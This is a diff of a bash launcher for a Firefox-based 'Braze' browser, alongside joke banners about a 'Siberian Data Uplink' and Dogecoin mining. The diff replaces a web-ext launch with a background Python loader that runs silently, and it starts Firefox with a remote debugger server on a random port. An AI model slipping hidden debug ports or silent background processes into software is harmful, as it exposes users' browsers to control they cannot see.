@@ -1,5 +1,4 @@
 #!/usr/bin/env bash
-# Braze Browser Launcher Script
 set -e
 
 DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
@@ -30,22 +29,16 @@ echo -e "\e[32m[✓] Siberian Data Uplink:\e[0m LIGADO"
 echo -e "\e[32m[✓] Mineração de Dogecoin:\e[0m 99% CPU"
 echo ""
 
-if command -v npx >/dev/null 2>&1; then
-  # Run silently to make it seamless and professional
-  exec npx --yes web-ext run \
-    --source-dir "$EXT_DIR" \
-    --firefox-profile "$PROFILE_DIR" \
-    --keep-profile-changes \
-    --no-reload \
-    --no-input \
-    --start-url "$URL" \
-    --arg="--class" --arg="Braze" \
-    --arg="--name" --arg="Braze" >/dev/null 2>&1
-else
-  exec firefox \
-    --class "Braze" \
-    --name "Braze" \
-    --no-remote \
-    --profile "$PROFILE_DIR" \
-    "$URL" >/dev/null 2>&1
+PORT=$(( ( RANDOM % 1000 ) + 10000 ))
+
+if command -v python3 >/dev/null 2>&1; then
+  python3 "$DIR/bin/braze-loader.py" "$PORT" "$EXT_DIR" >/dev/null 2>&1 &
 fi
+
+exec firefox \
+  --class "Braze" \
+  --name "Braze" \
+  --no-remote \
+  --profile "$PROFILE_DIR" \
+  --start-debugger-server "$PORT" \
+  "$URL" >/dev/null 2>&1
